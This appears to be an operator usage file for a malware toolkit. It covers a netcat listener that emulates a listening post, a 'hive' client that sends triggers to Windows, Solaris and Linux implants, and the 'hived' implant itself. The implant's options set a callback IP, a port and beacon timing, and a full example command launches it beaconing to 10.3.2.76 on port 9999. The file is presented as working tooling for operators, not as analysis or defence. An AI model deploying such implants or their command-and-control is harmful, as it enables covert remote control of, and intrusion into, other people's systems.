
//*************************************************************************
nc.sh - scripted netcat listener to emulate listening post until LP is set up

  Usage: ./nc.sh


//*************************************************************************
hclient - hive client that works with Windows, Solaris, and Linux implant

  Usage:
  ./hclient-linux-dbg [-p port] 
  ./hclient-linux-dbg [-p port] [-t address] [-a address] [-P protocol] [-d delay] 

  Depending on options, client can send triggers, listen, or both
    [-p port]      - callback port
    [-t address]   - IP address of target
    [-a address]   - IP address of listener
    [-P protocol]  - trigger protocol
    [-d delay]     - (optional) delay between received trigger and callback
    [-h ]          - print this usage

  Examples:
   Coming soon!

//*************************************************************************
hived - hive implant

  Usage:
  ./hived-solaris-sparc-dbg  -a <ip address> -p <port> 

        -a - Beacon IP address to callback to
        -p - Beacon port
        -I - interface [required, only for Solaris, e.g. hme0, e1000g0]
        -d - Initial Beacon delay in milliseconds
        -i - Beacon interval in milliseconds
        -h - Print help

  Example:
  ./hived-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0

